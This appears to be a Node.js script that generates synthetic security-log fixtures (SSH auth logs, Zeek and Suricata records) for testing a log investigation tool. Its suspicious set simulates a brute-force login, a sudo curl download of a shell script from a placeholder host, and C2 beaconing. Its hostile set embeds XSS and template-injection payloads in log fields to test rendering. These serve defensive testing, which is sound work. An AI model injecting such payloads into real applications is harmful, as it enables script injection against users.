#!/usr/bin/env node
/* Deterministic synthetic fixtures. All addresses are RFC 1918 or RFC 5737
   documentation ranges and all names use reserved .example/.test domains.
   Usage: node fixtures/generate.mjs [--large N] */
import { writeFileSync, mkdirSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

const Synthetic = createRequire(import.meta.url)('../src/investigation/synthetic.js');
const here = dirname(fileURLToPath(import.meta.url));
const args = process.argv.slice(2);
const largeIndex = args.indexOf('--large');
const LARGE = largeIndex >= 0 ? Number(args[largeIndex + 1]) : 50000;

function rng(seed) { let a = seed >>> 0; return () => { a = (a + 0x6D2B79F5) | 0; let t = Math.imul(a ^ (a >>> 15), 1 | a); t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t; return ((t ^ (t >>> 14)) >>> 0) / 4294967296; }; }
const T0 = Date.UTC(2026, 9, 23, 18, 0, 0);
const iso = ms => new Date(ms).toISOString().replace('Z', '+0000');
const epoch = ms => (ms / 1000).toFixed(6);
const MON = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
const sys = ms => { const d = new Date(ms); return MON[d.getUTCMonth()] + ' ' + String(d.getUTCDate()).padStart(2, ' ') + ' ' + d.toISOString().slice(11, 19); };
const write = (rel, text) => { const p = join(here, rel); mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, text); return p; };
const ZEEK_CONN_FIELDS = ['ts', 'uid', 'id.orig_h', 'id.orig_p', 'id.resp_h', 'id.resp_p', 'proto', 'service', 'duration', 'orig_bytes', 'resp_bytes', 'conn_state'];
const ZEEK_DNS_FIELDS = ['ts', 'uid', 'id.orig_h', 'id.orig_p', 'id.resp_h', 'id.resp_p', 'proto', 'query', 'qtype_name', 'rcode_name', 'answers'];
const zeekHeader = (path, fields) => ['#separator \\x09', '#set_separator\t,', '#empty_field\t(empty)', '#unset_field\t-', '#path\t' + path, '#open\t2026-10-23-18-00-00', '#fields\t' + fields.join('\t'), '#types\t' + fields.map(() => 'string').join('\t')].join('\n') + '\n';
const zeekRow = values => values.map(v => v == null ? '-' : String(v)).join('\t') + '\n';

/* ------------------------------------------------------------------ benign */
{
  const r = rng(11);
  let auth = '';
  auth += `${sys(T0 + 60000)} web-01 sshd[2101]: Accepted publickey for bob from 10.20.0.41 port 50122 ssh2: ED25519 SHA256:synthetic\n`;
  auth += `${sys(T0 + 300000)} web-01 sshd[2140]: Failed password for alice from 10.20.0.50 port 50311 ssh2\n`;
  auth += `${sys(T0 + 308000)} web-01 sshd[2140]: Failed password for alice from 10.20.0.50 port 50311 ssh2\n`;
  auth += `${sys(T0 + 315000)} web-01 sshd[2140]: Accepted password for alice from 10.20.0.50 port 50311 ssh2\n`;
  auth += `${sys(T0 + 316000)} web-01 sshd[2140]: pam_unix(sshd:session): session opened for user alice(uid=1001) by (uid=0)\n`;
  auth += `${sys(T0 + 900000)} web-01 CRON[2200]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)\n`;
  auth += `${sys(T0 + 1800000)} web-01 sudo[2301]:    alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status nginx\n`;
  write('benign/auth.log', auth);
  let conn = zeekHeader('conn', ZEEK_CONN_FIELDS), t = T0;
  const sites = ['192.0.2.10', '192.0.2.20', '198.51.100.30', '203.0.113.40', '198.51.100.55'];
  for (let i = 0; i < 60; i++) {
    t += 5000 + Math.floor(r() * 240000);
    conn += zeekRow([epoch(t), 'CBn' + i, '10.20.0.31', 49000 + i, sites[Math.floor(r() * sites.length)], 443, 'tcp', 'ssl', (r() * 20).toFixed(3), Math.floor(r() * 4000), Math.floor(r() * 90000), 'SF']);
  }
  for (let i = 0; i < 40; i++) conn += zeekRow([epoch(T0 + i * 64000 + 120), 'CBt' + i, '10.20.0.31', 123, '192.0.2.123', 123, 'udp', 'ntp', '0.010', 48, 48, 'SF']);
  for (let i = 0; i < 40; i++) conn += zeekRow([epoch(T0 + i * 30000 + 90), 'CBd' + i, '10.20.0.31', 53000 + i, '10.20.0.2', 53, 'udp', 'dns', '0.002', 40, 90, 'SF']);
  write('benign/conn.log', conn);
  let dns = zeekHeader('dns', ZEEK_DNS_FIELDS);
  const names = [['www.example.com', '192.0.2.10'], ['mail.example.net', '192.0.2.20'], ['cdn.example.org', '198.51.100.30']];
  for (let i = 0; i < 30; i++) { const [q, a] = names[i % names.length]; dns += zeekRow([epoch(T0 + i * 91000 + Math.floor(r() * 30000)), 'CBq' + i, '10.20.0.31', 54000 + i, '10.20.0.2', 53, 'udp', q, 'A', 'NOERROR', a]); }
  for (const [i, q] of ['wwww.example.com', 'exmaple.com', 'intranet.corp.example'].entries()) dns += zeekRow([epoch(T0 + 400000 + i * 70000), 'CBx' + i, '10.20.0.31', 55000 + i, '10.20.0.2', 53, 'udp', q, 'A', 'NXDOMAIN', null]);
  write('benign/dns.log', dns);
}

/* -------------------------------------------------------------- suspicious */
{
  const r = rng(23);
  const A = '203.0.113.45';
  let auth = '', t = T0 + 120000;
  auth += `${sys(T0 + 30000)} web-01 sshd[3001]: Accepted publickey for bob from 10.20.0.41 port 50122 ssh2: ED25519 SHA256:synthetic\n`;
  const users = ['admin', 'root', 'deploy', 'test', 'admin', 'root', 'deploy', 'oracle', 'admin', 'deploy'];
  users.forEach((u, i) => {
    t += 9000 + Math.floor(r() * 9000);
    const invalid = ['admin', 'test', 'oracle'].includes(u);
    if (invalid) auth += `${sys(t - 400)} web-01 sshd[${3100 + i}]: Invalid user ${u} from ${A} port ${40100 + i}\n`;
    auth += `${sys(t)} web-01 sshd[${3100 + i}]: Failed password for ${invalid ? 'invalid user ' : ''}${u} from ${A} port ${40100 + i} ssh2\n`;
  });
  t += 7000;
  auth += `${sys(t)} web-01 sshd[3120]: message repeated 2 times: [ Failed password for root from ${A} port 40120 ssh2]\n`;
  t += 6000;
  auth += `${sys(t)} web-01 sshd[3121]: Failed password for invalid user <img src=x onerror=alert('nv-auth')> from ${A} port 40121 ssh2\n`;
  t += 21000;
  const success = t;
  auth += `${sys(t)} web-01 sshd[3130]: Accepted password for deploy from ${A} port 40130 ssh2\n`;
  auth += `${sys(t + 1000)} web-01 sshd[3130]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)\n`;
  auth += `${sys(t + 95000)} web-01 sudo[3140]:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -s http://update-cdn.example/agent.sh\n`;
  write('suspicious/auth.log', auth);

  const client = '10.20.0.23', c2 = '198.51.100.77', burst = success + 4 * 60000;
  let dns = zeekHeader('dns', ZEEK_DNS_FIELDS);
  const letters = 'abcdefghijklmnopqrstuvwxyz0123456789';
  for (let i = 0; i < 15; i++) {
    let name = ''; for (let k = 0; k < 11; k++) name += letters[Math.floor(r() * letters.length)];
    dns += zeekRow([epoch(burst + i * 2300), 'CNx' + i, client, 51000 + i, '10.20.0.2', 53, 'udp', name + '.test', 'A', 'NXDOMAIN', null]);
  }
  const resolved = burst + 15 * 2300 + 4000;
  dns += zeekRow([epoch(resolved), 'CNr0', client, 51100, '10.20.0.2', 53, 'udp', 'update-cdn.example', 'A', 'NOERROR', c2]);
  dns += zeekRow([epoch(T0 + 50000), 'CNb0', client, 51200, '10.20.0.2', 53, 'udp', 'www.example.com', 'A', 'NOERROR', '192.0.2.10']);
  write('suspicious/dns.log', dns);

  let conn = zeekHeader('conn', ZEEK_CONN_FIELDS);
  let start = resolved + 2500;
  for (let i = 0; i < 45; i++) {
    const ts = start + i * 60000 + Math.floor((r() - 0.5) * 3000);
    conn += zeekRow([epoch(ts), 'CB' + i.toString(36).padStart(3, '0') + 'beacon', client, 50000 + i, c2, 443, 'tcp', 'ssl', (0.2 + r() * 0.3).toFixed(3), 310 + Math.floor(r() * 40), 1200 + Math.floor(r() * 200), 'SF']);
  }
  for (let i = 0; i < 25; i++) conn += zeekRow([epoch(T0 + Math.floor(r() * 3600000)), 'CBw' + i, client, 49000 + i, ['192.0.2.10', '198.51.100.30', '203.0.113.40'][i % 3], 443, 'tcp', 'ssl', (r() * 9).toFixed(3), 800, 40000, 'SF']);
  conn += zeekRow([epoch(start - 1000), 'CBconflict', client, 50999, c2, 443, 'tcp', 'ssl', '0.300', 300, 1200, 'SF']);
  conn += zeekRow([epoch(start + 3000000), 'CBconflict', '10.20.0.99', 50998, '192.0.2.10', 80, 'tcp', 'http', '0.300', 300, 1200, 'SF']);
  conn += zeekRow([null, 'CBnots', client, 50997, '192.0.2.10', 443, 'tcp', 'ssl', '0.100', 100, 100, 'S0']);
  write('suspicious/conn.log', conn);

  const eve = [];
  eve.push({ timestamp: iso(resolved + 2600), flow_id: 1001, event_type: 'alert', src_ip: client, src_port: 50000, dest_ip: c2, dest_port: 443, proto: 'TCP', alert: { action: 'allowed', signature_id: 9000001, signature: 'NV SYNTHETIC TLS certificate self-signed to rare host', category: 'Potentially Bad Traffic', severity: 2 } });
  eve.push({ timestamp: iso(success + 95500), flow_id: 1002, event_type: 'http', src_ip: '10.20.0.10', src_port: 41000, dest_ip: c2, dest_port: 80, proto: 'TCP', http: { hostname: 'update-cdn.example', url: '/agent.sh', http_method: 'GET', status: 200, http_user_agent: "curl/8.5 <script>alert('nv-eve')</script>" } });
  eve.push({ timestamp: iso(success + 95600), flow_id: 1002, event_type: 'alert', src_ip: '10.20.0.10', src_port: 41000, dest_ip: c2, dest_port: 80, proto: 'TCP', alert: { action: 'allowed', signature_id: 9000002, signature: 'NV SYNTHETIC shell script download via curl', category: 'Attempted User Privilege Gain', severity: 1 } });
  eve.push({ timestamp: iso(success + 96000), '@timestamp': new Date(success + 96000 + 7200000).toISOString(), flow_id: 1003, event_type: 'dns', src_ip: '10.20.0.2', src_port: 53, dest_ip: '10.20.0.10', dest_port: 39000, proto: 'UDP', dns: { type: 'answer', rrname: 'update-cdn.example', rrtype: 'A', rcode: 'NOERROR', answers: [{ rrname: 'update-cdn.example', rrtype: 'A', rdata: c2 }] } });
  eve.push({ flow_id: 1004, event_type: 'flow', src_ip: '10.20.0.10', src_port: 41000, dest_ip: c2, dest_port: 80, proto: 'TCP', flow: { start: iso(success + 95400), end: iso(success + 95900), bytes_toserver: 400, bytes_toclient: 6200, state: 'closed' } });
  eve.push({ event_type: 'flow', src_ip: '10.20.0.10', src_port: 41001, dest_ip: '192.0.2.10', dest_port: 443, proto: 'TCP', flow: { bytes_toserver: 100, bytes_toclient: 100 } });
  write('suspicious/eve.json', eve.map(e => JSON.stringify(e)).join('\n') + '\n');
}

/* --------------------------------------------------------------- malformed */
{
  const ok = { timestamp: iso(T0), event_type: 'flow', src_ip: '10.20.0.5', src_port: 40000, dest_ip: '192.0.2.10', dest_port: 443, proto: 'TCP', flow: { start: iso(T0) } };
  const lines = [
    JSON.stringify(ok),
    '{"timestamp":"2026-10-23T18:00:01.000000+0000","event_type":"dns","src_ip":"10.20.0.5"',
    '[1,2,3]',
    '"just a string"',
    JSON.stringify({ timestamp: iso(T0 + 2000), src_ip: '10.20.0.5', dest_ip: '192.0.2.10' }),
    JSON.stringify({ ...ok, timestamp: iso(T0 + 3000), src_ip: '999.1.2.3', dest_port: 70000 }),
    'GARBAGE\u0000\u0001\u0002\u0003\u0004\u0005\u0006binary\u0007\u0008\u000e\u000f',
    JSON.stringify(ok),
    JSON.stringify({ ...ok, timestamp: 'not-a-time' }),
    '{"timestamp": "2026-10-23T18:00:09Z", "event_type": "alert", "alert": {"signature": "unterminated'
  ];
  write('malformed/eve.json', lines.join('\n') + '\n');
  let zeek = 'orphan\tline\tbefore\theader\n' + zeekHeader('conn', ZEEK_CONN_FIELDS);
  zeek += zeekRow([epoch(T0), 'Cm1', '10.20.0.5', 40000, '192.0.2.10', 443, 'tcp', 'ssl', '1.0', 10, 10, 'SF']);
  zeek += 'too\tfew\tfields\n';
  zeek += zeekRow([epoch(T0 + 1000), 'Cm2', 'not-an-ip', 40001, '192.0.2.10', 'port?', 'tcp', 'ssl', '1.0', 10, 10, 'SF']);
  write('malformed/conn.log', zeek);
  write('malformed/auth-missing-columns.csv', 'when,who,where\n2026-10-23T18:00:00Z,alice,10.20.0.5\n');
  write('malformed/auth-quotes.csv', 'timestamp,user,src_ip,result\n2026-10-23T18:00:00Z,"alice,10.20.0.5,failure\n2026-10-23T18:00:05Z,bob,10.20.0.6,success\n2026-10-23T18:00:06Z,carol,10.20.0.7\n');
  write('malformed/unknown.txt', 'this is not a log\nnor is this\n');
}

/* ------------------------------------------------------------- timestamps */
{
  const rows = [
    'event_id,timestamp,received_time,user,src_ip,result,app',
    'e1,2026-10-23T18:30:00Z,2026-10-23T18:30:01Z,alice@corp.example,10.20.0.50,success,vpn',
    'e2,2026-10-23T18:31:00+05:30,,bob@corp.example,10.20.0.41,success,vpn',
    'e3,2026-10-23 18:32:00,,carol@corp.example,10.20.0.42,failure,vpn',
    'e4,1792780380,,dave@corp.example,10.20.0.43,success,vpn',
    'e5,10/23/2026 6:34 PM,,erin@corp.example,10.20.0.44,success,vpn',
    'e6,05/06/2026 10:00,,frank@corp.example,10.20.0.45,success,vpn',
    'e7,,,grace@corp.example,10.20.0.46,failure,vpn',
    'e8,last tuesday,,heidi@corp.example,10.20.0.47,success,vpn',
    'e9,2026-10-23T18:39:00Z,2026-10-23T20:39:00Z,ivan@corp.example,10.20.0.48,success,vpn',
    'e1,2026-10-23T18:30:00Z,2026-10-23T18:30:01Z,alice@corp.example,10.20.0.50,failure,vpn',
    'e10,1970-01-01T00:00:00Z,,judy@corp.example,10.20.0.49,success,vpn',
    'e11,2026-10-23T18:41:00Z,,mallory@corp.example,10.20.0.51,maybe,vpn',
    'e2,2026-10-23T18:31:00+05:30,,bob@corp.example,10.20.0.41,success,vpn'
  ];
  write('timestamps/idp-signins.csv', rows.join('\n') + '\n');
  const sysl = [
    `${sys(T0 + 60000)} vpn-01 sshd[10]: Accepted publickey for ops from 10.20.0.60 port 50000 ssh2`,
    `2026-10-23T18:02:00.123456+00:00 vpn-01 sshd[11]: Accepted publickey for ops from 10.20.0.60 port 50001 ssh2`,
    `<38>1 2026-10-23T18:03:00Z vpn-01 sshd 12 - - Failed password for ops from 10.20.0.61 port 50002 ssh2`
  ];
  write('timestamps/mixed-syslog.log', sysl.join('\n') + '\n');
}

/* ----------------------------------------------------------------- hostile */
{
  const payloads = ['<img src=x onerror=alert(1)>', '<script>alert("nv")</script>', '"><svg/onload=alert(2)>', "javascript:alert('x')", '<iframe srcdoc="<script>parent.alert(3)</script>">', '{{constructor.constructor("alert(4)")()}}', '\u202Etxt.exe'];
  const eve = payloads.map((p, i) => JSON.stringify({ timestamp: iso(T0 + i * 1000), event_type: i % 2 ? 'http' : 'alert', src_ip: '10.20.0.66', src_port: 41000 + i, dest_ip: '192.0.2.66', dest_port: 80, proto: 'TCP', host: p, alert: { signature: p, severity: 2 }, http: { hostname: p, url: '/' + p, http_user_agent: p } }));
  eve.push(JSON.stringify({ timestamp: iso(T0 + 9000), event_type: 'dns', src_ip: '192.0.2.53', dest_ip: '10.20.0.66', dns: { type: 'answer', rrname: payloads[0], rcode: 'NOERROR', answers: [{ rrtype: 'CNAME', rdata: payloads[1] }] } }));
  write('hostile/eve.json', eve.join('\n') + '\n');
}

/* ------------------------------------------------------------------- large */
{
  const text = Synthetic.large(LARGE);
  const p = write('generated/large-' + LARGE + '.eve.json', text);
  console.log('wrote', p, (text.length / 1048576).toFixed(1) + ' MiB');
}
console.log('fixtures written under', here);
